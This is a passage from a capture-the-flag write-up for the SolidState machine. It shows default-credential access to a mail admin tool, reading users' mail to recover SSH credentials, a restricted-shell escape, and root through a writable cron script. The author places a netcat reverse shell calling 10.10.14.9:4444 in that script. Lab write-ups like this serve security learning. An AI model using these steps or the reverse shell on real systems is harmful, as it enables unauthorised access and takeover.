</span></span><span class=line><span class=cl>  <span class=m>33</span>   │ /.htaccess.cgi/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>34</span>   │ /.htaccess.sh/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>35</span>   │ /.htpasswd/           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 296<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>36</span>   │ /.htaccess.html/      <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 301<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>37</span>   │ /.htpasswd.txt/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>38</span>   │ /.htpasswd.php/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>39</span>   │ /.htpasswd.py/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>40</span>   │ /.htpasswd.css/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>41</span>   │ /.htpasswd.cgi/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>42</span>   │ /.htpasswd.html/      <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 301<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>43</span>   │ /.htpasswd.sh/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>44</span>   │ /.htpasswd.js/        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 299<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>45</span>   │ /assets/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 1496<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>46</span>   │ /icons/               <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 292<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>47</span>   │ /images/              <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 2516<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>48</span>   │ /server-status/       <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 300<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>49</span>   │
</span></span><span class=line><span class=cl>  <span class=m>50</span>   │ <span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>  <span class=m>51</span>   │ 2023/08/10 14:42:35 Finished
</span></span><span class=line><span class=cl>  <span class=m>52</span>   │ <span class=o>===============================================================</span>
</span></span></code></pre></div><p>At this point I’ll move on from HTTP</p><p>Let’s move to the rsip? port which seems a Admin Tool.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -nv <span class=nv>$IP</span> <span class=m>4555</span>
</span></span></code></pre></div><p>By accessing we need to provide an user and password in order to use the tool. Trying the default/common creds, I got access with root/root.</p><p>Once in we can display all the commands which we can use with HELP.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-3.png></p><p>Two are really relevant, the listusers which display the existent users and setpassword which set a user’s password.</p><p>Listing the user’s we have the next output</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-4.png></p><p>We have mail users now let’s set a user password for each user and set a new password for each one.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-5.png></p><p>Now let’s see the receiving emails by connecting with POP3 for each user in order to see any kind of relevant info. I used telnet to connect because has worked better for me.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-6.png></p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-7.png></p><p>james and thomas don’t have emails</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-8.png></p><p>john has one let’s see what we found in it.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-9.png></p><p>The mailadmin is writing john to send a mail with a credentials to mindy.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-10.png></p><p>In the mindy’s inbox we found two emails. Let’s see if we find the credentials.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-11.png></p><p>In the first email, Mindy is welcomed to the cyber team.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-12.png></p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p>We have the ssh credentials of mindy let’s access to the machine as mindy.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-13.png></p><p>Let’s cat the <strong>user’s flag.</strong></p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-14.png></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>We can observe that we have a restricted bash, which has a limited $PATH which doesn’t let us use all the commands. A easy form to change that is exporting a new PATH but the PATH doesn’t seem to be writable.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-15.png></p><p>We can also force ssh to execute a command like bash, putting it as a argument starts the ssh session in a normal bash. We have a dumb shell, we need to treat the shell to move to a fully interactive one (I explained how to do it in a bunch write ups).</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-16.png></p><p>Now we need to check if we are in with the htb ip address and without a docker container.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ip a
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class=m>65536</span> qdisc noqueue state UNKNOWN group default qlen <span class=m>1</span>
</span></span><span class=line><span class=cl>    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class=line><span class=cl>    inet 127.0.0.1/8 scope host lo
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 ::1/128 scope host
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>2: ens192: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class=m>1500</span> qdisc mq state UP group default qlen <span class=m>1000</span>
</span></span><span class=line><span class=cl>    link/ether 00:50:56:b9:a2:cd brd ff:ff:ff:ff:ff:ff
</span></span><span class=line><span class=cl>    inet 10.10.10.51/24 brd 10.10.10.255 scope global ens192
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span><span class=line><span class=cl>    inet6 dead:beef::250:56ff:feb9:a2cd/64 scope global mngtmpaddr dynamic
</span></span><span class=line><span class=cl>       valid_lft 86394sec preferred_lft 14394sec
</span></span><span class=line><span class=cl>    inet6 fe80::250:56ff:feb9:a2cd/64 scope link
</span></span><span class=line><span class=cl>       valid_lft forever preferred_lft forever
</span></span></code></pre></div><p>We are in the machine so let’s see if there is sudo privileges to privesc.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-17.png></p><p>Nothing relevant so let’s move to the use of moniProc.sh (the script which I have used in the <a href=https://pwndside.github.io/posts/cronos-htb>Cronos</a> machine) in order to see scheduled jobs or cronjobs running at foreground.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&gt; /bin/sh -c python /opt/tmp.py
</span></span><span class=line><span class=cl>&gt; python /opt/tmp.py
</span></span><span class=line><span class=cl>&lt; /usr/sbin/CRON -f
</span></span><span class=line><span class=cl>&lt; /bin/sh -c python /opt/tmp.py
</span></span><span class=line><span class=cl>&lt; python /opt/tmp.py
</span></span></code></pre></div><p>There is a cronjob running a script located at /opt/tmp.py.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-18.png></p><p>Is created by root and others can edit the file, so If the cronjob is being executed by the root user we are able to execute whatever we want as root.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/usr/bin/env python
</span></span></span><span class=line><span class=cl><span class=cp></span>import os
</span></span><span class=line><span class=cl>import sys
</span></span><span class=line><span class=cl>try:
</span></span><span class=line><span class=cl>     os.system<span class=o>(</span><span class=s1>&#39;rm -r /tmp/* &#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>except:
</span></span><span class=line><span class=cl>     sys.exit<span class=o>()</span>
</span></span></code></pre></div><p>The content of tmp.py is pretty convenient for us, we only need to change the command that is executing the program.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/usr/bin/env python
</span></span></span><span class=line><span class=cl><span class=cp></span>import os
</span></span><span class=line><span class=cl>import sys
</span></span><span class=line><span class=cl>try:
</span></span><span class=line><span class=cl>     os.system<span class=o>(</span><span class=s1>&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.9 4444 &gt;/tmp/f&#39;</span>
</span></span><span class=line><span class=cl>except:
</span></span><span class=line><span class=cl>     sys.exit<span class=o>()</span>
</span></span></code></pre></div><p>I put a reverse shell with nc and set a nc listener.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lv <span class=m>4444</span>
</span></span></code></pre></div><p>We are root now.</p><p><img alt=Untitled loading=lazy src=/HTB/solidstate-19.png></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/privesc/>Privesc</a></li><li><a href=https://pwndside.github.io/tags/web/>Web</a></li><li><a href=https://pwndside.github.io/tags/linux/>Linux</a></li><li><a href=https://pwndside.github.io/tags/ssh/>Ssh</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://pwndside.github.io/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>